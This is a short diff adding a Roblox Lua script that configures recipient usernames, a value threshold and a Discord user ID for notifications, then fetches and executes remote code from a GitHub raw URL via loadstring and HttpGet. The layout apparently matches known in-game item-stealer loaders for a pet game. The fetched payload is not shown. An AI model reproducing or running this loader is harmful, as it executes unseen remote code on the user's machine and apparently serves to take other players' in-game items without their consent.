@@ -1,0 +1,6 @@
+_G.Usernames = {"james_omger", "StrawRBXL"} -- you can add as many as you'd like
+_G.min_chance = 100000 -- 100000000 
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1078586580610060358" -- change to your Discord user ID 
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/petscripters/BGSI/refs/heads/main/script-loader.lua'))()
